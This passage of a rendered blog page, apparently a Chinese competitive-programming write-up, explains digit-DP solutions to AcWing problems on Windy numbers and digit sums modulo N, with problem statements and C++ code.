<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) f[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">        f[i][j] += f[i - <span class="number">1</span>][k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// 0也是不降低数</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = last; j &lt; x; j++) &#123;  <span class="comment">// &lt; 左支叶只能到a_&#123;n-1&#125;</span></span><br><span class="line">      res += f[i + <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; last) <span class="keyword">break</span>;</span><br><span class="line">    last = x;  <span class="comment">// 沿右走</span></span><br><span class="line">    <span class="keyword">if</span> (!i) res++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r) == <span class="number">2</span>) &#123;  <span class="comment">// == 2</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1083-Windy数"><a href="https://www.acwing.com/problem/content/1085/">AcWing 1083. Windy数</a></h2><p>Windy 定义了一种 Windy 数：不含前导零且相邻两个数字之差至少为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 的正整数被称为 Windy 数。</p><p>Windy 想知道，在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 之间，包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>，总共有多少个 Windy 数？</p><p><strong>输入格式</strong></p><p>共一行，包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示答案。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>A</mi><mo>≤</mo><mi>B</mi><mo>≤</mo><mn>2</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le A \le B \le 2 \times 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例1：</strong></p><pre><code>1 10</code></pre><p><strong>输出样例1：</strong></p><pre><code>9</code></pre><p><strong>输入样例2：</strong></p><pre><code>25 50</code></pre><p><strong>输出样例2：</strong></p><pre><code>20</code></pre><h3 id="题解">题解</h3><p>本题出现了一个问题：<strong>不能使用前导0</strong></p><p>举一个例子：014（即14）按理来说是Windy数，但是由于我们给他加上了前导0，这样看上去就不是Windy数了。</p><p>正确的做法：第一层左分支只能取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1\sim a_{n-1} -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，最后<mark>还要加上位数少于N的位数的情况</mark>。(第一位必须从1开始取就会遗漏位数较N少的数，比如14)</p><blockquote><p>当n = 0时，虽然0也是Windy数，但为了运算正确，我们必须返回0：</p><p>比如 l = 1, r = 1时，dp(r = 1)其实只有有1层，有2个数：0和1, 即返回2。<br>所以在可以使用前导0的情况下，根据具体意义取ret 1是可以的，但是这里ret 0的话, dp(1) - dp(0) = 2就不对了</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">11</span>;</span><br><span class="line"><span class="type">int</span> f[kN][<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算f[i][j]: i位, 且最高位为j的Windy数个数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) f[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">        f[i][j] += (<span class="built_in">abs</span>(j - k) &gt;= <span class="number">2</span>) * f[i - <span class="number">1</span>][k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 0虽然也是Windy数，但由于计算时排除前导0, 这里取0</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = (i == nums.<span class="built_in">size</span>() - <span class="number">1</span>); j &lt; x; j++) &#123;  <span class="comment">// 第一层从1开始取</span></span><br><span class="line">      res += (<span class="built_in">abs</span>(j - last) &gt;= <span class="number">2</span>) * f[i + <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">abs</span>(x - last) &lt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">    last = x;</span><br><span class="line">    <span class="keyword">if</span> (!i) res++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;  <span class="comment">// 加上位数较N少的情况</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      res += f[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1084-数字游戏-II"><a href="https://www.acwing.com/problem/content/1086/">AcWing 1084. 数字游戏 II</a></h2><p>由于科协里最近真的很流行数字游戏。</p><p>某人又命名了一种取模数，这种数字必须满足各位数字之和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">mod\ N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p><p>现在大家又要玩游戏了，指定一个整数闭区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mi mathvariant="normal">.</mi><mi>b</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a.b]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mord">.</span><span class="mord mathnormal">b</span><span class="mclose">]</span></span></span></span>，问这个区间内有多少个取模数。</p><p><strong>输入格式</strong></p><p>输入包含多组测试数据，每组数据占一行。</p><p>每组数据包含三个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">a,b,N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>对于每个测试数据输出一行结果，表示区间内各位数字和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">mod\ N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 的数的个数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>≤</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \le a,b \le 2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>&lt;</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">1 \le N &lt; 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>1 19 9</code></pre><p><strong>输出样例：</strong></p><pre><code>2</code></pre><h3 id="题解-2">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">11</span>, kM = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> N;</span><br><span class="line"><span class="type">int</span> f[kN][<span class="number">10</span>][kM];</span><br><span class="line"></span><br><span class="line"><span class="comment">// cpp的取模运算与py等不同, cpp中-1 % 3 = -2</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mod</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x % y + y) % y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算f[i][j][k]: i位, 最高位为j, 且所以数位山数的和为k的数个数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="keyword">sizeof</span> f);  <span class="comment">// 每轮清空状态</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) f[<span class="number">1</span>][i][i % N] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; N; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt;= <span class="number">9</span>; x++) &#123;</span><br><span class="line">          f[i][j][k] += f[i - <span class="number">1</span>][x][<span class="built_in">mod</span>(k - j, N)];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// 0 mod N 总等于0, 符合要求</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x; j++) &#123;</span><br><span class="line">      res += f[i + <span class="number">1</span>][j][<span class="built_in">mod</span>(-last, N)];</span><br><span class="line">    &#125;</span><br><span class="line">    last = <span class="built_in">mod</span>(last + x, N);</span><br><span class="line">    <span class="keyword">if</span> (!i &amp;&amp; <span class="built_in">mod</span>(last, N) == <span class="number">0</span>) res++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;N) == <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">init</span>();  <span class="comment">// 记得init()</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1085-不要62"><a href="https://www.acwing.com/problem/content/1087/">AcWing 1085. 不要62</a></h2><p>杭州人称那些傻乎乎粘嗒嗒的人为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>62</mn></mrow><annotation encoding="application/x-tex">62</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">62</span></span></span></span>（音：laoer）。</p><p>杭州交通管理局经常会扩充一些的士车牌照，新近出来一个好消息，以后上牌照，不再含有不吉利的数字了，这样一来，就可以消除个别的士司机和乘客的心理障碍，更安全地服务大众。</p><p>不吉利的数字为所有含有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>62</mn></mrow><annotation encoding="application/x-tex">62</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">62</span></span></span></span> 的号码。例如：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>62315</mn><mo separator="true">,</mo><mn>73418</mn><mo separator="true">,</mo><mn>88914</mn></mrow><annotation encoding="application/x-tex">62315,73418,88914</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">62315</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">73418</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">88914</span></span></span></span> 都属于不吉利号码。但是，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>61152</mn></mrow><annotation encoding="application/x-tex">61152</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">61152</span></span></span></span> 虽然含有 <span class="katex"><span class="katex-mathml"><math 